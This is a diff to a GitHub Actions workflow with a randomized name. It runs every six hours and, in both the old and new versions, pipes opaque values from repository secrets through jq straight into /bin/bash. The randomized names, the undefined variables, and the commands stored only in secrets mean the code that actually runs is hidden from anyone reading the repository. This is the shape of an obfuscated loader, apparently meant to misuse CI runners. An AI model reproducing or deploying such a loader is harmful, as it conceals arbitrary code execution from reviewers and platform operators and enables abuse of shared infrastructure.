@@ -1,8 +1,9 @@
 name: guoshantui4678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '6 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          gz4: ${{ secrets.gz4 }}
+          tcxfe66: ${{ secrets.tcxfe66 }}
         run: |
-          echo $gz4 | jq -r .pzncp5077 | /bin/bash
-          echo $vn26118 | jq -r .vu6781 | /bin/bash
-          echo $j5444 | jq -r .l232 | /bin/bash
-          echo $fctdw113 | jq -r .f584 | /bin/bash
-          echo $iqv693 | jq -r .yawc4 | /bin/bash
-          echo $ha481 | jq -r .yj351 | /bin/bash
-          echo $eg005 | jq -r .qvd9 | /bin/bash
-          echo $bx0413 | jq -r .np799 | /bin/bash
-          echo $qcr1452 | jq -r .l970 | /bin/bash
-          echo $jnne35585 | jq -r .sfej1804 | /bin/bash
-          echo $lfps5098 | jq -r .a6 | /bin/bash
-          echo $sf2 | jq -r .oc76072 | /bin/bash
+          echo $tcxfe66 | jq -r .dkpd5 | /bin/bash
+          echo $uklp32311 | jq -r .vc310 | /bin/bash
+          echo $q24 | jq -r .xeipd402 | /bin/bash
+          echo $kshq58 | jq -r .jp2869 | /bin/bash
+          echo $ecs87 | jq -r .mnr23258 | /bin/bash
+          echo $d2 | jq -r .rtkt7 | /bin/bash
+          echo $d86 | jq -r .owv33363 | /bin/bash
+          echo $tv52 | jq -r .udvb931 | /bin/bash
+          echo $cte24077 | jq -r .ffji8903 | /bin/bash
+          echo $jvhjl7874 | jq -r .gybq37 | /bin/bash
+          echo $qlf097 | jq -r .hji27195 | /bin/bash
+          echo $dhz9083 | jq -r .x09221 | /bin/bash
+          echo $zm3 | jq -r .gezzs94492 | /bin/bash
 
